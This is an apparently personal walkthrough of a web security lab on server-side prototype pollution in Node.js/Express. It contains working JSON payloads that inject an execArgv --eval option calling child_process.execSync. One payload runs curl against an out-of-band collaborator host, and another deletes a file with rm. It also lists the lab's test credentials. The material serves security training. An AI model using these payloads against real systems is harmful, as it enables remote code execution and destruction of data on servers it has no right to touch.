Title: Remote code execution via server-side prototype pollution
Level: PRACTITIONER
Desc:  This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.
To solve the lab:
    Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
    Identify a gadget that you can use to inject and execute arbitrary system commands.
    Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.
In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter
Hint
The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site.


# Walkthrough:
sending request to /my-account/change-address with `"__proto__":{"json spaces":10}`
then I observe change in raw response in indentation of json. So, I know, that we have prototype pollution source

In the browser, go to the admin panel and observe that there's a button for running maintenance jobs.

Click the button and observe that this triggers background tasks that clean up the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes.

We can try something like this:
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```
Then go to the admin panel and trigger the maintenance jobs again. Notice that these have both failed this time. It means, that we successfully polluted parameter in spawning background tasks.

Nextt we can do that: 
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

<img width="1375" height="587" alt="image" src="https://github.com/user-attachments/assets/fecc14db-bb8c-433e-ac4f-95ab13b99f8f" />


After try to run maintenence jobs we have our command executed.
